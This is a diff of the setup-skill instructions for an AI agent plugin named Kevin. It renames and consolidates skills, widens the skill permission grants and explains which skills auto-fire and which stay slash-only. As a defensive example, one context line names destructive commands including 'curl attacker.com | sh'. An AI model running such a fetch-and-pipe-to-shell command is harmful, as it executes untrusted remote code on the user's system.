@@ -5,7 +5,7 @@ disable-model-invocation: true
 allowed-tools: Read, Write, Edit, AskUserQuestion, WebFetch, mcp__plugin_agent-kevin_kevin__codex_setup, mcp__plugin_agent-kevin_kevin__home_history, Bash(mkdir *), Bash(cp *), Bash(cat *), Bash(ls *), Bash(find *), Bash(git config *), Bash(readlink *), Bash(uname *), Bash(date *), Bash(echo *), Bash(test *), Bash([ *), Bash(grep *), Bash(printf *), Bash(sed *), Bash(bun *), Bash(unzip -l *)
 ---
 
-> Operator-invoked only. Run this when the operator named this skill, or when a skill the operator invoked calls for it as a documented step; otherwise stop and ask before doing anything. Claude Code enforces this through the frontmatter above, Codex does not.
+> Operator-invoked only. Run this when the operator named this skill, or when a skill the operator invoked calls for it as a documented step; otherwise stop and ask before doing anything. Claude Code enforces this through the frontmatter above, Codex through `agents/openai.yaml`; this line is the backstop for any host that reads neither.
 
 # Initialize the agent
 
@@ -294,7 +294,7 @@ update so template changes arrive phrased in this agent's name instead of propos
 ## Step 1c — Starting from a seed bundle?
 
 If the operator mentioned a seed bundle when invoking init (a `*-seed.zip` from a
-teammate's `/agent-kevin:seed-export` or the AgentLayer website wizard), or you want to
+teammate's `/agent-kevin:seed export` or the AgentLayer website wizard), or you want to
 offer it, ask:
 
 > **Do you have a seed bundle from a teammate?**
@@ -316,8 +316,8 @@ init is about to create).
   signal topics) — a seed never carries those; they're what keeps the inherited agent
   personal to this user.
 
-After Step 9's confirmation, finish by delegating to the seed-import flow: read
-`${CLAUDE_PLUGIN_ROOT}/skills/seed-import/SKILL.md` and follow it against the noted
+After Step 9's confirmation, finish by delegating to the seed import flow: read
+`${CLAUDE_PLUGIN_ROOT}/skills/seed/references/playbooks/import.md` and follow it against the noted
 bundle path (dry-run plan → confirm → apply → credential checklist). Don't reimplement
 its steps here.
 
@@ -543,7 +543,7 @@ Ask in plain chat (not `AskUserQuestion`, the answers are freeform), one message
 
 Parse the reply leniently and stage, without writing yet (Step 7 writes them after the scaffold, never over an existing file at the same path):
 
-- **Projects** → one `<PROJECTS>/<slug>/README.md` and `tasks/` each, using the README template in `${CLAUDE_PLUGIN_ROOT}/skills/create-project/SKILL.md` step 3 (read it; don't restate it here). Naming them here is the operator's go, so skip that skill's confirmation. Derive each slug and prefix the way it says, and fill Current Focus from anything the operator said about the project.
+- **Projects** → one `<PROJECTS>/<slug>/README.md` and `tasks/` each, using the README template in `${CLAUDE_PLUGIN_ROOT}/skills/project/references/playbooks/create.md` step 3 (read it; don't restate it here). Naming them here is the operator's go, so skip that skill's confirmation. Derive each slug and prefix the way it says, and fill Current Focus from anything the operator said about the project.
 - **Goals** → `<KNOWLEDGE>/concepts/roadmap-draft.md`, a `| When | Milestone |` table, noting that `/agent-kevin:roadmap` renders it into `roadmap.html`.
 - **Company** → `<KNOWLEDGE>/concepts/company-profile.md`: company, website, what it does, the operator's role. `WebFetch` the website (public pages only, the Step 5 rules) and add what it says about the company, citing the URL.
 
@@ -593,7 +593,7 @@ Stage for the `## Hard Rules` section.
 
 ## Step 6b — Signal topics
 
-These drive the news in your briefings: the `morning-briefing` skill reads `knowledge/user/profile.md` → `## Signal Topics` and runs a web search per topic, so the brief surfaces articles about your interests, projects, industry, and the things you care about, not generic headlines. The whole point is to **recommend** a starter set, not interrogate the user, so do the work first.
+These drive the news in your briefings: the briefing skill's morning brief reads `knowledge/user/profile.md` → `## Signal Topics` and runs a web search per topic, so the brief surfaces articles about your interests, projects, industry, and the things you care about, not generic headlines. The whole point is to **recommend** a starter set, not interrogate the user, so do the work first.
 
 **Propose a derived starter list before asking.** Synthesise 5–8 topics from everything you already learned this session:
 - The **role** picked in Step 3 (e.g. coding focus → the languages/frameworks/tooling ecosystem; research focus → their fields).
@@ -1183,22 +1183,33 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
       "mcp__plugin_agent-kevin_kevin__task_update",
       "mcp__plugin_agent-kevin_kevin__video_frames",
       "Skill(agent-kevin:adversarial-review)",
+      "Skill(agent-kevin:api-collections)",
+      "Skill(agent-kevin:briefing)",
+      "Skill(agent-kevin:browser-flows)",
+      "Skill(agent-kevin:configure-skills)",
       "Skill(agent-kevin:dashboard)",
       "Skill(agent-kevin:engineer)",
       "Skill(agent-kevin:find-session)",
+      "Skill(agent-kevin:flywheel)",
       "Skill(agent-kevin:focus)",
+      "Skill(agent-kevin:goals)",
       "Skill(agent-kevin:history)",
       "Skill(agent-kevin:humanizer)",
+      "Skill(agent-kevin:itinerary)",
+      "Skill(agent-kevin:knowledge-compile)",
       "Skill(agent-kevin:mermaid)",
       "Skill(agent-kevin:plan-spec)",
+      "Skill(agent-kevin:project)",
       "Skill(agent-kevin:release)",
       "Skill(agent-kevin:roadmap)",
-      "Skill(agent-kevin:seed-export)",
-      "Skill(agent-kevin:seed-import)",
+      "Skill(agent-kevin:seed)",
+      "Skill(agent-kevin:self-review)",
+      "Skill(agent-kevin:seo)",
       "Skill(agent-kevin:setup-worktree)",
       "Skill(agent-kevin:sync)",
       "Skill(agent-kevin:tax)",
-      "Skill(agent-kevin:upgrade)"
+      "Skill(agent-kevin:upgrade)",
+      "Skill(agent-kevin:wordpress-rest)"
     ]
   }
 }
@@ -1220,11 +1231,11 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
 | Database-gated | `database_list`, `database_query`, `database_schema`, `database_fork` | configure-skills A.2c (Database walk) |
 | GitHub-gated | `github_pr_*`, `github_run_*`, `github_issue_*`, `github_fast_forward` | configure-skills A.2d (GitHub walk) |
 
-The allow list also carries seventeen **skill** grants. Skills register regardless of permissions — the grant only suppresses the confirm prompt on model invocation (whether Kevin auto-fires the skill directly or one skill invokes another via the Skill tool). `Skill(agent-kevin:dashboard)`, `Skill(agent-kevin:engineer)`, `Skill(agent-kevin:find-session)`, `Skill(agent-kevin:focus)`, `Skill(agent-kevin:history)`, `Skill(agent-kevin:humanizer)`, `Skill(agent-kevin:mermaid)`, `Skill(agent-kevin:roadmap)`, `Skill(agent-kevin:seed-export)`, `Skill(agent-kevin:seed-import)`, `Skill(agent-kevin:setup-worktree)`, `Skill(agent-kevin:sync)`, `Skill(agent-kevin:tax)`, `Skill(agent-kevin:upgrade)`, and `Skill(agent-kevin:adversarial-review)` are **active**: all are model-invocable (no `disable-model-invocation`). `dashboard` refreshes-and-opens the Agent OS dashboard on a plain "refresh the dashboard"; `focus` owns the operator's day: it fills the dashboard's Today view and project focus pages, turns "take this on" into a planned task only after a confirming question, and runs the standup, week, and session playbooks ("where am I", triage, checkpoint); `dashboard` and `sync` invoke its `where-am-i` playbook to freshen the session radar (one source of truth for the radar); `find-session` is the radar's content-search sibling, firing when the operator names *what* a session worked on rather than when it ran; `history` fires on "turn on history" / "can I undo changes to your memory" and asks before it writes anything; `humanizer` fires when Kevin is asked to strip AI-writing tells from a draft; `mermaid` fires when Kevin authors or edits a Mermaid diagram, validating it before review; `roadmap` fires when the user asks for a roadmap or plan-on-a-page, interviewing for the frame before rendering; `seed-export` fires on "export the agent for a teammate" / "make a seed bundle", running the interview + review gate before anything is zipped; `seed-import` fires when the operator hands over a `*-seed.zip` (its underlying `seed_import` tool sits in `ask`, so the actual write still confirms); `setup-worktree` fires on "make me a worktree for X"; `engineer` fires on code work in a repo (fix, build, refactor, simplify, "why is this slow", "review 142", "walk me through my PR") and routes it to a playbook, including the three read-only PR playbooks; `sync` runs the full state refresh (compile → lint → flywheel → briefing → dashboards) and is chained by `upgrade` after a HOME migration; `tax` fires on "what's due", a receipt handed over, or a message from the accountant, keeps the operator's tax deadlines as dated tasks, and never files, pays, or sends anything; `upgrade` applies pending HOME migrations after a `/plugin update`, so a plain "upgrade kevin" is enough — the operator doesn't have to know the slash command; `adversarial-review` fires on how the operator actually asks ("get a second model on this branch / plan") rather than only on its slash name; neither it nor the PR playbooks write to GitHub. `Skill(agent-kevin:plan-spec)` and `Skill(agent-kevin:release)` are **latent**: both set `disable-model-invocation` (slash-only — `/plan-spec`, `/release`), so the grant does nothing until that flag is dropped; they're kept here so the slash invocation never prompts. `release` (producer-only) cuts a versioned release + CHANGELOG entry.
+The allow list also carries a **skill** grant for every skill but two. Skills register regardless of permissions: the grant only suppresses the confirm prompt on model invocation (whether Kevin auto-fires the skill or one skill invokes another through the Skill tool). Every skill is model-invocable except `init`, `release` and `rename-agent`, so the operator asks in plain words ("brief me", "set today's goals", "how's my site ranking", "review 142") and never has to remember a slash name. The playbook skills route inside themselves: `briefing` (morning, evening, pulse), `goals` (day, week, month, year), `seo` (audit, console, speed, serp, rank), `seed` (export, import), `project` (create, archive), `focus` and `engineer`. A skill that writes still asks before it writes: `seed` import's `seed_import` tool sits in `ask`, `project` confirms before creating or archiving, and `configure-skills`, `self-review` and the goals interviews confirm each change. A pack skill that fires on a home without its keys stops at the first missing-key error and names the `/agent-kevin:configure-skills` walk that fixes it; `seo` spends SerpAPI credit only on an explicit SERP ask or an audit anomaly.
 
-**PR work is the one credential-gated exception to model invocation.** `engineer` is a core skill, but its three PR playbooks run on the GitHub pack, and `adversarial-review` uses it for a PR target. Every other credential-gated pack skill (the SEO six, `browser-flows`) sets `disable-model-invocation`, because a pack skill registers on every install whether or not the operator configured it: auto-firing there burns a turn on a missing key, spends metered credit (SerpAPI bills per call), or assumes a stack they don't run (`wordpress-rest` assumes WordPress). `api-collections` is pack-labelled but needs no credential, so it stays model-invocable like any core skill. They earn the exception because failing unconfigured costs nothing — one `github_pr_*` call returns the actionable "GITHUB_TOKEN not set — run `/agent-kevin:configure-skills` → GitHub pack" error and stops — and because "review 142" is the phrasing operators actually reach for. Don't read this as licence to unflag the rest of the packs.
+**`init` and `release` stay slash-only** (`disable-model-invocation`, plus `agents/openai.yaml` with `policy.allow_implicit_invocation: false` for Codex, which ignores the flag, and the one-line operator-only guard): a first-run wizard and a version cut are never something to fire unasked. `release` keeps its grant so `/release` doesn't prompt.
 
-**`rename-agent` is deliberately absent from this list.** It is `disable-model-invocation` like the latent three, but unlike them it gets no grant, so even `/rename-agent` raises a confirm prompt. It rewrites files across the entire brain in one pass; the prompt is the last thing standing between a mistyped invocation and a swept home. Adding the grant would look like tidying an oversight and would remove that gate.
+**`rename-agent` is slash-only the same way and deliberately absent from this list,** so even `/rename-agent` raises a confirm prompt. It rewrites files across the entire brain in one pass; the prompt is the last thing standing between a mistyped invocation and a swept home. Adding the grant would look like tidying an oversight and would remove that gate.
 
 **Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).
 
@@ -1298,12 +1309,12 @@ If Step 4b returned `skip`, omit the `## Where Things Live` section entirely —
 
 "Empty-with-frontmatter stub" = the file's body (post-frontmatter) is empty or whitespace-only. Treat any non-whitespace body content — bullets, paragraphs, headings — as operator content worth preserving.
 
-**`profile.md` always carries `## Signal Topics`.** The staged `profile.md` content — whether synthesised from Step 5 URLs or the empty stub — must end with a `## Signal Topics` section built from Step 6b, with the descriptive lead `morning-briefing` looks for:
+**`profile.md` always carries `## Signal Topics`.** The staged `profile.md` content — whether synthesised from Step 5 URLs or the empty stub — must end with a `## Signal Topics` section built from Step 6b, with the descriptive lead the morning brief looks for:
 
 ```markdown
 ## Signal Topics
 
-News/research topics to track for briefings and signals. Used by morning-briefing and any task that needs topical web search.
+News/research topics to track for briefings and signals. Used by the morning brief and any task that needs topical web search.
 
 - <topic from Step 6b>
 - <topic from Step 6b>
@@ -1350,7 +1361,7 @@ If Step 5 URL synthesis surfaced anything that fills or contradicts this skeleto
 
 Also write `.claude/settings.local.json` so the file exists with the correct gitignored permissions from day one. The env keys init owns are `AGENT_HOME_TIMEZONE` from Step 4 (always written — the SessionStart hook compares it against the live machine timezone and flags the operator as traveling when they differ) and the **optional** primary-codebase pair from Step 4b, written only when a path was actually captured.
 
-**Secrets live in `.kevin/secrets/.env`, not here.** Credential pack keys (`PERPLEXITY_API_KEY`, `SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, every `AGENT_DB_*`) go in the deny-gated `.kevin/secrets/.env` — `/agent-kevin:configure-skills` ensures that file exists and tells the user which `KEY=value` lines to add (the file is deny-gated, so Claude can't write its contents; the user edits it). Kevin's config loader surfaces it into `process.env` at boot; the settings `env` block is no longer a secrets store. `GSC_SITE_URL` is the one pack key that **stays** in `settings.local.json` `env` — it's not a credential and two skills (`wordpress-rest`, `google-search-audit`) read it straight from the Bash environment, which only the settings `env` block reaches. Google OAuth client JSON + tokens live in `.kevin/secrets/google/`. This keeps `settings.local.json` non-secret and an accurate audit trail of what the operator opted into.
+**Secrets live in `.kevin/secrets/.env`, not here.** Credential pack keys (`PERPLEXITY_API_KEY`, `SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, every `AGENT_DB_*`) go in the deny-gated `.kevin/secrets/.env` — `/agent-kevin:configure-skills` ensures that file exists and tells the user which `KEY=value` lines to add (the file is deny-gated, so Claude can't write its contents; the user edits it). Kevin's config loader surfaces it into `process.env` at boot; the settings `env` block is no longer a secrets store. `GSC_SITE_URL` is the one pack key that **stays** in `settings.local.json` `env` — it's not a credential and two skills (`wordpress-rest`, and the `seo` skill's audit) read it straight from the Bash environment, which only the settings `env` block reaches. Google OAuth client JSON + tokens live in `.kevin/secrets/google/`. This keeps `settings.local.json` non-secret and an accurate audit trail of what the operator opted into.
 
 Env spelling: HOME-scoped keys are written under their shared, agent-neutral `AGENT_*` names — the file's location already scopes them to this agent, and the HOME stays portable. The agent's own prefix (`KEVIN_*`) is a valid override everywhere and always wins; it's required only in machine-wide `~/.claude/settings.json`, where the prefix is what keeps one agent's value from reaching every agent on the box (which is why `KEVIN_HOME` keeps it).
 
@@ -1462,20 +1473,24 @@ Substitute `<NAME>` with the operator's name from Step 4a and `<YYYY-MM-DD>` wit
 For `projects/TASKS.md`, write this scaffold — the task-list sections render automatically when the `dashboard` tool first runs (which the auto-rebuild on the user's first task creation will trigger):
 
 ```markdown
-> Tasks hub — auto-generated by Kevin from task frontmatter on every mutation. Do not edit this file directly: tasks change via the task tools, goals via the weekly-goals / monthly-goals / yearly-goals skills.
+> Tasks hub — auto-generated by Kevin from task frontmatter on every mutation. Do not edit this file directly: tasks change via the task tools, goals via the goals skill.
 
 <!-- GOALS:START -->
+## Daily Goals
+
+_No daily goals set yet — run `goals day` to set today's._
+
 ## Weekly Goals
 
-_No weekly goals set yet — run the weekly-goals skill to set them._
+_No weekly goals set yet — run `goals week` to set them._
 
 ## Monthly Goals
 
-_No monthly goals set yet — run the monthly-goals skill (proposed on the 1st of each month)._
+_No monthly goals set yet — run `goals month`._
 
 ## Yearly Goals
 
-_No yearly goals set yet — run the yearly-goals skill to plan the year by quarters._
+_No yearly goals set yet — run `goals year` to plan the year by quarters._
 <!-- GOALS:END -->
 ```
 
@@ -1551,7 +1566,7 @@ The scaffold is done. Before showing the final confirmation, offer to wire up AP
 > **Activate skill packs now?**
 > Each pack already ships loaded with the plugin. Activating a pack grants its MCP tool permissions in `settings.json` (so calls don't re-prompt), plants the non-secret `GSC_SITE_URL` placeholder in `settings.local.json`, and ensures `.kevin/secrets/.env` exists for the secret keys you'll add via your editor. Skip entirely if you want to come back later via `/agent-kevin:configure-skills`.
 >
-> - ☐ SEO pack (serpapi · open-page-rank · GSC · page-speed · WP · search-audit)
+> - ☐ SEO pack (the seo skill: audit · Search Console · PageSpeed · SERP · rank; plus wordpress-rest)
 > - ☑ Browser pack **(recommended)** (browser screenshot/pdf/record + browser-flows + optional Perplexity search)
 > - ☐ Database pack (connect Kevin to one or more Postgres databases — read-only `database_list`/`database_schema`/`database_query` + `database_fork` to clone a local DB for risky schema work)
 > - ☐ GitHub pack **(recommended when you gave a code path)** (read-only PR, issue + GitHub Actions access — `github_pr_*` / `github_issue_*` / `github_run_*` — to review PRs/issues and diagnose failing CI builds, plus `github_fast_forward`, which is what keeps your checkouts current on every `/agent-kevin:sync`; needs `GITHUB_TOKEN` **and** the `gh` CLI)
@@ -1657,7 +1672,7 @@ Blank line, then the **Next** heading (same style as Ready), then the relaunch p
 > claude
 > ```
 >
-> **Running Codex from this home?** Relaunch with `codex` instead, trust the folder when asked (that is what lets Codex read the home's `.codex/config.toml`, where Kevin's MCP server is registered), run `/hooks`, and trust the 4 Kevin entries (the ones whose command runs `bin/kevin`: `session-start`, `session-capture` twice, `guard`). Until then, Codex starts without Kevin's context and captures nothing. Skills are invoked with `$name` there (`$quick-pulse`, `$sync`); the plugin itself installs with `codex plugin marketplace add <PLUGIN_DIR>` then `codex plugin add agent-kevin@agentdev-kevin`.
+> **Running Codex from this home?** Relaunch with `codex` instead, trust the folder when asked (that is what lets Codex read the home's `.codex/config.toml`, where Kevin's MCP server is registered), run `/hooks`, and trust the 4 Kevin entries (the ones whose command runs `bin/kevin`: `session-start`, `session-capture` twice, `guard`). Until then, Codex starts without Kevin's context and captures nothing. Skills are invoked with `$name` there (`$briefing`, `$sync`); the plugin itself installs with `codex plugin marketplace add <PLUGIN_DIR>` then `codex plugin add agent-kevin@agentdev-kevin`.
 >
 > **Watch for a marketplace trust prompt.** On first relaunch, Claude Code asks "this project wants to register a marketplace and enable a plugin — trust it?" **Accept it.** If you dismiss/miss the prompt, the plugin won't load and the SessionStart banner won't appear — recover by running:
 >
@@ -1674,8 +1689,8 @@ Blank line, then the **Next** heading (same style as Ready), then the relaunch p
 > - `/agent-kevin:roadmap` — turn the roadmap draft into `roadmap.html` (only when Step 5d staged one)
 > - `/agent-kevin:dashboard` — open the Agent OS dashboard (your whole setup on one page)
 > - `/agent-kevin:configure-skills` — configure skill packs (SEO, Browser) or author a custom skill
-> - `/agent-kevin:create-project` — start your first project
-> - `/agent-kevin:morning-briefing` — see what Kevin knows about you
+> - `/agent-kevin:project create` — start your first project
+> - `/agent-kevin:briefing morning` — see what Kevin knows about you
 > - `mcp__plugin_agent-kevin_kevin__ping` — health check the MCP server
 >
 > Open `<HOME_DIR>` in Obsidian to view/edit your wiki.
